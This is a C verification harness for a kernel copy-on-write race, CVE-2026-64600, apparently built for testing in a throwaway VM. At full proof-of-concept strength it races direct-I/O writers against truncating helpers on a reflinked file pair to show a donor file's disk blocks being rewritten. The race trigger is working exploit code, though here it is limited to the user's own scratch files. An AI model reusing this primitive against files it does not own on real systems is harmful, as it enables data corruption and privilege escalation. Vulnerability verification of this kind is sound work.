/*
 * refluxfs_verify.c — VM-ONLY verification harness for CVE-2026-64600.
 *
 * NOT part of SKELETONKEY. This exists to answer one question that the
 * shipped module deliberately refuses to answer: is THIS kernel actually
 * vulnerable? The shipped trigger is intentionally under-driven (8 writers /
 * 2 helpers / 2s) so it never grinds toward a win on a production box. Here,
 * inside a throwaway VM, we drive it at the public PoC's parameters
 * (32 writers / 8 helpers) for a real time budget.
 *
 * It is still confined to files THIS USER OWNS in a private scratch dir. It
 * does not clone, read, or touch /etc/passwd or any other file we do not own.
 * A win corrupts 4 KiB of our own donor file and nothing else.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define BLK          4096u
#define ALIGN        4096u
#define DONOR_BYTE   0x5a
#define ATTACK_BYTE  0x41

#ifndef FICLONE
#define FICLONE _IOW(0x94, 9, int)
#endif

static int WRITERS = 32;   /* public PoC parameter */
static int HELPERS = 8;    /* public PoC parameter */
static int BUDGET  = 60;   /* seconds */

static char donor[1024], clonep[1024];
static atomic_int gate, stop;

static void *writer_fn(void *a)
{
    (void)a;
    int fd = open(clonep, O_RDWR | O_DIRECT);
    if (fd < 0) return NULL;
    void *buf = NULL;
    if (posix_memalign(&buf, ALIGN, BLK) != 0) { close(fd); return NULL; }
    memset(buf, ATTACK_BYTE, BLK);
    while (!atomic_load_explicit(&gate, memory_order_acquire)) sched_yield();
    (void)!pwrite(fd, buf, BLK, 0);
    free(buf); close(fd);
    return NULL;
}

static void *helper_fn(void *a)
{
    (void)a;
    int fd = open(clonep, O_RDWR);
    if (fd < 0) return NULL;
    while (!atomic_load_explicit(&gate, memory_order_acquire)) sched_yield();
    while (!atomic_load_explicit(&stop, memory_order_acquire)) {
        (void)!ftruncate(fd, (off_t)BLK * 2); (void)fdatasync(fd);
        (void)!ftruncate(fd, (off_t)BLK);     (void)fdatasync(fd);
    }
    close(fd);
    return NULL;
}

static int build_pair(void)
{
    int dfd = open(donor, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (dfd < 0) return -1;
    void *buf = NULL;
    if (posix_memalign(&buf, ALIGN, BLK) != 0) { close(dfd); return -1; }
    memset(buf, DONOR_BYTE, BLK);
    ssize_t w = pwrite(dfd, buf, BLK, 0);
    free(buf);
    if (w != (ssize_t)BLK) { close(dfd); return -1; }
    (void)fsync(dfd);

    int cfd = open(clonep, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (cfd < 0) { close(dfd); return -1; }
    int rc = ioctl(cfd, FICLONE, dfd) == 0 ? 0 : -1;
    (void)fsync(cfd);
    close(cfd); close(dfd);
    return rc;
}

/* O_DIRECT read: the corruption lands under the inode, so a buffered read
 * would be served from a stale (correct-looking) page and hide a win. */
static int donor_diverged(void)
{
    int fd = open(donor, O_RDONLY | O_DIRECT);
    if (fd < 0) return -1;
    void *buf = NULL;
    if (posix_memalign(&buf, ALIGN, BLK) != 0) { close(fd); return -1; }
    int rc = -1;
    if (pread(fd, buf, BLK, 0) == (ssize_t)BLK) {
        const unsigned char *p = buf;
        rc = 0;
        for (size_t i = 0; i < BLK; i++) if (p[i] != DONOR_BYTE) { rc = 1; break; }
    }
    free(buf); close(fd);
    return rc;
}

int main(int argc, char **argv)
{
    const char *dir = argc > 1 ? argv[1] : "/var/tmp";
    if (argc > 2) BUDGET = atoi(argv[2]);

    char scratch[1024];
    snprintf(scratch, sizeof scratch, "%s/rfxverify-XXXXXX", dir);
    if (!mkdtemp(scratch)) { perror("mkdtemp"); return 1; }
    snprintf(donor,  sizeof donor,  "%s/donor", scratch);
    snprintf(clonep, sizeof clonep, "%s/clone", scratch);

    printf("[*] refluxfs verify: %d writers, %d helpers, %ds budget, scratch=%s\n",
           WRITERS, HELPERS, BUDGET, scratch);

    pthread_t *w = calloc(WRITERS, sizeof *w);
    pthread_t *h = calloc(HELPERS, sizeof *h);
    int won = 0; long rounds = 0;
    time_t deadline = time(NULL) + BUDGET;

    while (time(NULL) < deadline && !won) {
        if (build_pair() != 0) { fprintf(stderr, "[-] FICLONE failed\n"); break; }
        atomic_store(&gate, 0); atomic_store(&stop, 0);

        int nw = 0, nh = 0;
        for (int i = 0; i < WRITERS; i++) if (!pthread_create(&w[nw], NULL, writer_fn, NULL)) nw++;
        for (int i = 0; i < HELPERS; i++) if (!pthread_create(&h[nh], NULL, helper_fn, NULL)) nh++;
        usleep(1500);
        atomic_store(&gate, 1);
        for (int i = 0; i < nw; i++) pthread_join(w[i], NULL);
        atomic_store(&stop, 1);
        for (int i = 0; i < nh; i++) pthread_join(h[i], NULL);

        rounds++;
        if (donor_diverged() == 1) won = 1;
        if ((rounds % 200) == 0) { printf("    ... %ld rounds\n", rounds); fflush(stdout); }
    }

    printf("%s after %ld rounds\n",
           won ? "[!] RACE WON — donor's on-disk bytes were rewritten through a still-shared block"
               : "[i] no divergence observed", rounds);

    unlink(donor); unlink(clonep); rmdir(scratch);
    free(w); free(h);
    return won ? 2 : 0;
}
